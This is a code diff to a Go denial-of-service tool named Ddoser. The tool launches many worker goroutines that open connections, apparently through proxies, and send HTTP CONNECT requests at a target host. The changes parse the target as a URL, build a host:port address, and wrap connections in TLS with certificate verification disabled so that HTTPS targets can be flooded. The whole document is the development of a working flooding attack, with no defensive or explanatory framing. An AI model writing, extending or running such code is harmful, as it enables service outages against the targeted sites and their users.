@@ -2,22 +2,24 @@ package main
 
 import (
 	"bufio"
+	"crypto/tls"
 	"net"
+	"net/url"
 	"time"
 
 	"github.com/valyala/fasthttp"
 )
 
 type Ddoser struct {
-	url        string
+	url        *url.URL
 	numWorkers int
 	headers    []string
 	proxies    []string
 }
 
-func NewDdoser(target string, number int, headers, proxies []string) (*Ddoser, error) {
+func NewDdoser(u *url.URL, number int, headers, proxies []string) (*Ddoser, error) {
 	return &Ddoser{
-		url:        target,
+		url:        u,
 		numWorkers: number,
 		headers:    headers,
 		proxies:    proxies,
@@ -26,6 +28,7 @@ func NewDdoser(target string, number int, headers, proxies []string) (*Ddoser, e
 
 func (d *Ddoser) Run() {
 	for i := 0; i < d.numWorkers; i++ {
+		addr := net.JoinHostPort(d.url.Hostname(), d.url.Port())
 		go func() {
 			var conn net.Conn
 			var err error
@@ -34,7 +37,14 @@ func (d *Ddoser) Run() {
 					continue
 				}
 
-				req := "CONNECT " + d.url + " HTTP/1.1\r\n\r\n"
+				if d.url.Scheme == "https" {
+					conn = tls.Client(conn, &tls.Config{
+						ServerName:         d.url.Hostname(),
+						InsecureSkipVerify: true,
+					})
+				}
+
+				req := "CONNECT " + addr + " HTTP/1.1\r\n\r\n"
 
 				if _, err = conn.Write([]byte(req)); err != nil {
 					continue
